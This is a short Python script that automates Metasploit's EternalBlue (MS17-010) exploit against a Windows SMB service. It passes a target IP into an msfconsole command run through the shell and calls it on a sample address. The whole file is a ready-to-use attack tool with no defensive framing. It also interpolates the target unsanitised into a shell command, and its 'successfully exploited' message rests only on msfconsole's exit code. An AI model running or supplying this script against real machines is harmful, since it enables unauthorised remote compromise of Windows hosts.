import subprocess

def exploit_ms17_010(target_ip, target_port=445):
    command = f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target_ip}; set RPORT {target_port}; run'"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"Successfully exploited {target_ip} on port {target_port} with MS17-010.")
    else:
        print(f"Failed to exploit {target_ip} on port {target_port} with MS17-010: {result.stderr}")

# Example usage
exploit_ms17_010("192.168.1.100")